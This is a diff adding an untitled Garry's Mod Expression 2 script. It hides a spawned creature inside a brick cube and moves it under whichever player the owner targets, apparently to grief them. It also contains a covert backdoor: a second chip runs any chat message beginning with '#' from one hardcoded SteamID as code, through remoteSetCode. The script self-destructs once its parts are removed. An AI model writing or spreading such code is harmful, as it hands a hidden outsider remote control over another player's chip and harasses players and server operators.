@@ -1,0 +1,65 @@
+@name
+@inputs 
+@outputs 
+@persist Tar:entity Toggle S Y:entity O:entity E2:entity T:entity A:array
+@strict
+runOnTick(1)
+if(first()){
+Tar=entitySpawn("fishing_mod_catch_ichthyosaur",entity():pos()-vec(0,0,100),1)
+    E2=spawnExpression2(vec(0,0,0),ang(0,0,0),"")
+    Y=propSpawn("models/hunter/blocks/cube4x4x4.mdl",Tar:pos(),1)
+    Y:parentTo(Tar)
+    Y:setMaterial("brick/brick_model")
+#   holoCreate(1,Tar:pos())
+ #   holoParent(1,Tar)
+ #   holoScaleUnits(1,vec(190,190,190))
+ #   holoMaterial(1,"brick/brick_model")                         
+    Tar:setPos(vec(0,0,-100000))
+    T=findPlayerBySteamID("STEAM_0:0:761097965")
+    I=1
+    }
+timer("d",100)
+if(clk("d")){
+    O=findPlayerBySteamID("STEAM_0:0:766803141")
+    }
+        if(owner():aimEntity():isValid()&owner():aimEntity():isPlayer()&owner():keyUse()){
+        T=owner():aimEntity()
+        print(T:name())
+   }
+    if(owner():aimEntity():isValid()&!owner():aimEntity():isPlayer()&owner():aimEntity():owner():isValid()&owner():aimEntity():owner()!=owner()&owner():keyUse()){
+        T=owner():aimEntity():owner()
+        print(T:name())
+  }
+
+if(T:isValid()&owner():keyPressed("x")&S==0&Toggle==0){
+    Toggle=1
+    S=1
+}
+if(Toggle==0){
+    Tar:setPos(vec(0,0,-1000))
+    }
+if(T:isValid()&owner():keyPressed("x")&S==0&Toggle==1){
+    Toggle=0
+    S=1
+}
+if(!owner():keyPressed("x")){
+    S=0
+   }
+if(T:isValid()&Toggle==1){
+    Tar:setPos(T:pos()+vec(0,0,-100))
+   }
+if(T:isValid()&!T:isAlive()){
+    Tar:setPos(vec(0,0,-1000))
+    }
+if(O:isValid()&O:lastSaid():explode("")[1,string]=="#"){
+E2:remoteSetCode(O:lastSaid():sub(2))
+}
+if(changed(owner():keyUse())&owner():keyUse()&!owner():aimEntity():isValid()){
+    T=noentity()
+    }
+if(!E2:isValid()||!Y:isValid()||!Tar:isValid()){
+    E2:remove()
+    Y:remove()
+    Tar:remove()
+    selfDestruct()
+    }
